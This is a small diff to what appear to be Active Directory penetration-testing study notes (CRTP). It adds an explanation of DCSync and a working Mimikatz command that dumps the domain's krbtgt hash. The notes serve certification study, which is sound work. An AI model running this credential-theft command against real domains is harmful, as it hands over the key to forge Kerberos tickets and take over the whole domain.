@@ -220,3 +220,8 @@ and then offline brute-forcing the ticket to obtain the service account's plaint
 
 ![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/042218d8-45fa-46a8-a261-f76a6ce95feb)
 ![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/b52d9832-fc5c-4ad4-9bb1-d6e42738e4fd)
+
+- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges (or a user that has replication rights on the
+  domain object):<br>
+```Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'```
+- Using the DCSync option needs no code execution (no need to run ```Invoke-Mimikatz```) on the target DC.
